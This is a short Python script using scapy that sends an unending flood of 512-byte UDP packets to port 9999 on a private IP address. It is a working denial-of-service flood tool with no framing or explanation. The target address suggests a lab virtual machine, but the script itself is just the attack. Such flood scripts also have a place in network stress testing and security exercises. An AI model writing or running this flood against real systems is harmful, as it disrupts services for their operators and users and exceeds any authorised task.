from scapy.all import *

target = "192.168.122.24"

while True:
    send(
        IP(dst=target) /
        UDP(dport=9999) /
        Raw(b"A"*512),
        verbose=False
    )
